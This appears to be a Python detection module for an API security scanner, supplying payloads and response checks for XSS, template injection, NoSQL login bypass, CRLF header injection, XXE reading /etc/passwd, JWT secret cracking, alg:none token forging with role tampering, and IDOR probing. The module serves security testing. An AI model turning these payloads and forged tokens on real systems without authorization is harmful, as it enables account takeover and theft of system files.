"""
Pure detection logic for the API attack suite (the "all-out" upgrade): payloads
and response classifiers for reflected XSS, SSTI, NoSQL injection, JWT
weaknesses, and IDOR/BOLA differentials on JSON APIs. No I/O, no subprocess, no
DB — the engine does the HTTP and hands responses here — so every function is
directly unit-testable and every "is this a vuln" decision lives in one place.

Design bias: high precision. Each detector is differential (probe vs a benign
control) or proof-carrying (a cracked JWT secret, an evaluated template) so a
weak signal never becomes a confirmed finding.
"""
import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse

# ---------------------------------------------------------------------------
# Reflected XSS
# ---------------------------------------------------------------------------
XSS_CANARY = "yggxss9r7"
XSS_PROBE = f"<{XSS_CANARY}>"


def unencoded_reflection(body: str, canary: str = XSS_CANARY) -> bool:
    """True when the raw '<canary>' is reflected verbatim (NOT entity-encoded).
    Encoded reflection (&lt;canary&gt;) is safe output and does not count, which
    is what keeps this from firing on properly-escaped apps."""
    if not body:
        return False
    return f"<{canary}>" in body


def xss_context(content_type: str) -> str:
    """'html' when the reflecting response is HTML (a raw reflection is directly
    executable), else 'other' (raw reflection is a candidate that needs a sink
    to confirm)."""
    return "html" if "text/html" in (content_type or "").lower() else "other"


# ---------------------------------------------------------------------------
# Server-Side Template Injection
# ---------------------------------------------------------------------------
# (payload, evaluated-marker). 7*7 style so the marker (49) can't be confused
# with the literal payload echoing back.
SSTI_PROBES = (
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("<%= 7*7 %>", "49"),
)
SSTI_BENIGN = "ygg7x7"


def ssti_evaluated(inj_body: str, benign_body: str, marker: str) -> bool:
    """True when the arithmetic marker appears in the injected response but NOT
    in the benign control (so an app that just happens to contain '49' somewhere
    doesn't trip it)."""
    return bool(marker) and marker in (inj_body or "") and marker not in (benign_body or "")


# ---------------------------------------------------------------------------
# NoSQL injection (operator injection on JSON login/query APIs)
# ---------------------------------------------------------------------------
# Body fragments placed in an identifier field; a login that returns a token for
# any of these has a NoSQL auth bypass. Non-destructive (read-only auth attempt).
NOSQLI_LOGIN_IDENTIFIERS = (
    {"$ne": None},
    {"$gt": ""},
    {"$ne": ""},
    {"$regex": ".*"},
)
NOSQLI_ERROR_RE = re.compile(
    r"(MongoError|MongoServerError|BSONError|E11000|\$where|"
    r"CastError|failed to parse|unexpected token .* in JSON|"
    r"com\.mongodb|couchdb|Unexpected end of JSON)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# CRLF / HTTP response header injection
# ---------------------------------------------------------------------------
CRLF_HEADER_NAME = "ygg-crlf-inj"


def crlf_payload(marker: str) -> str:
    """A parameter value that, if reflected into a response header unsanitized,
    injects a new header via CRLF. Sent URL-encoded by the caller (the \\r\\n
    becomes %0D%0A)."""
    return f"ygg\r\n{CRLF_HEADER_NAME}: {marker}"


def crlf_injected(resp_headers, marker: str) -> bool:
    """True when the injected header actually appears in the response (proof the
    CRLF split the header block)."""
    for k, v in dict(resp_headers or {}).items():
        if str(k).lower() == CRLF_HEADER_NAME and marker in str(v):
            return True
    return False


# ---------------------------------------------------------------------------
# XXE (XML external entity)
# ---------------------------------------------------------------------------
_ETC_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.MULTILINE)
_WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)


def xxe_payloads(entity="file:///etc/passwd"):
    """XXE bodies wrapping a local-file external entity in the common element
    shapes (incl. ginandjuice's stockCheck). Reads a harmless world-readable
    file to prove the entity resolves; never writes."""
    dtd = f'<!DOCTYPE r [ <!ENTITY xxe SYSTEM "{entity}"> ]>'
    head = '<?xml version="1.0" encoding="UTF-8"?>'
    # Inject the entity into several element positions: apps validate some fields
    # (e.g. a numeric productId rejects the entity) while echoing others, so we
    # try each to catch whichever one reflects.
    return [
        f'{head}{dtd}<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>',
        f'{head}{dtd}<stockCheck><productId>1</productId><storeId>&xxe;</storeId></stockCheck>',
        f'{head}{dtd}<root>&xxe;</root>',
        f'{head}{dtd}<foo><bar>&xxe;</bar></foo>',
    ]


def xxe_file_read(inj_body: str, benign_body: str = "") -> bool:
    """True when the injected response contains local-file content (etc/passwd or
    win.ini signature) that a benign XML request did NOT return."""
    b = inj_body or ""
    hit = bool(_ETC_PASSWD_RE.search(b)) or bool(_WIN_INI_RE.search(b))
    return hit and not (_ETC_PASSWD_RE.search(benign_body or "") or _WIN_INI_RE.search(benign_body or ""))


# ---------------------------------------------------------------------------
# JWT weaknesses
# ---------------------------------------------------------------------------
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{4,}\.eyJ[A-Za-z0-9_\-]{2,}\.[A-Za-z0-9_\-]*")

# Common HS256 signing secrets seen in the wild + framework defaults.
COMMON_JWT_SECRETS = (
    "secret", "secretkey", "secret_key", "password", "changeme", "admin",
    "jwt", "jwtsecret", "jwt_secret", "key", "private", "token", "test",
    "123456", "qwerty", "supersecret", "your-256-bit-secret", "your_jwt_secret",
    "mysecret", "s3cr3t", "shhhhh", "default", "app", "node", "express",
)


def _b64url_decode(seg: str) -> bytes:
    seg = seg + "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def decode_jwt(token: str):
    """Return (header_dict, payload_dict) without verifying the signature, or
    None if it isn't a decodable JWT."""
    parts = (token or "").split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        return header, payload
    except Exception:
        return None


def crack_jwt_hs256(token: str, secrets=COMMON_JWT_SECRETS):
    """If the token is HS256 and its signature verifies under one of `secrets`,
    return that secret (the app's JWT can then be forged). Else None."""
    parts = (token or "").split(".")
    if len(parts) != 3:
        return None
    decoded = decode_jwt(token)
    if not decoded or str(decoded[0].get("alg", "")).upper() != "HS256":
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    given_sig = parts[2]
    for secret in secrets:
        expected = _b64url_encode(hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest())
        if hmac.compare_digest(expected, given_sig):
            return secret
    return None


def forge_alg_none(token: str, tamper: dict = None) -> str | None:
    """Build an alg:none version of `token` (optionally tampering the payload,
    e.g. escalating a role). The engine sends it; if the server accepts it, the
    app trusts unsigned tokens. Returns the forged token or None."""
    decoded = decode_jwt(token)
    if not decoded:
        return None
    _, payload = decoded
    payload = dict(payload)
    if tamper:
        payload.update(tamper)
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


# ---------------------------------------------------------------------------
# IDOR / BOLA
# ---------------------------------------------------------------------------
_NUMERIC_ID_PATH = re.compile(r"/(\d{1,12})(?:/|$)")
_UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I)
_ID_PARAM_NAMES = ("id", "userid", "user_id", "account_id", "accountid", "orderid",
                   "order_id", "productid", "product_id", "basketid", "pid", "uid",
                   "customerid", "objectid")


def idor_candidates(urls: list) -> list:
    """Endpoints carrying an object id an attacker could tamper with. Returns
    [{"url","kind","where","id"}]: kind numeric|uuid, where path|param. These are
    where BOLA lives — /api/Users/1, /rest/basket/1, ?userId=42."""
    out, seen = [], set()
    for u in urls or []:
        parsed = urlparse(str(u))
        low_path = parsed.path
        m = _NUMERIC_ID_PATH.search(low_path)
        if m:
            key = (parsed.path, "path", m.group(1))
            if key not in seen:
                seen.add(key)
                out.append({"url": u, "kind": "numeric", "where": "path", "id": m.group(1)})
            continue
        mu = _UUID_RE.search(low_path)
        if mu:
            key = (parsed.path, "path", "uuid")
            if key not in seen:
                seen.add(key)
                out.append({"url": u, "kind": "uuid", "where": "path", "id": mu.group(0)})
            continue
        from urllib.parse import parse_qsl
        for k, v in parse_qsl(parsed.query):
            if k.lower() in _ID_PARAM_NAMES and (v.isdigit() or _UUID_RE.fullmatch(v)):
                key = (parsed.path, k, v)
                if key not in seen:
                    seen.add(key)
                    out.append({"url": u, "kind": "numeric" if v.isdigit() else "uuid",
                                "where": "param", "id": v, "param": k})
                break
    return out


def swap_numeric_id(value: str) -> list:
    """Neighboring ids to try for a numeric object id (BOLA probes)."""
    try:
        n = int(value)
    except ValueError:
        return []
    cands = {n + 1, n - 1, 1, 2}
    return [str(c) for c in cands if c >= 1 and c != n]


def looks_like_object(body: str) -> bool:
    """A non-trivial JSON object/array (a real resource), not an empty/error
    envelope. Used so an IDOR differential compares actual objects."""
    b = (body or "").strip()
    if not b or b[:1] not in ("{", "["):
        return False
    try:
        data = json.loads(b)
    except Exception:
        return False
    if isinstance(data, list):
        return len(data) > 0
    if isinstance(data, dict):
        # "data"/"status" envelopes: look inside.
        inner = data.get("data", data)
        return bool(inner) and inner != {} and inner != []
    return False


def idor_confirmed(other_status: int, other_body: str, self_body: str,
                   error_signature: bool = False) -> bool:
    """True when requesting ANOTHER user's object id returns a real object (200,
    object-shaped) that differs from your own object and isn't an error. High
    precision: requires a real object AND a difference from your own resource."""
    if other_status != 200 or error_signature:
        return False
    if not looks_like_object(other_body):
        return False
    return (other_body or "").strip() != (self_body or "").strip()
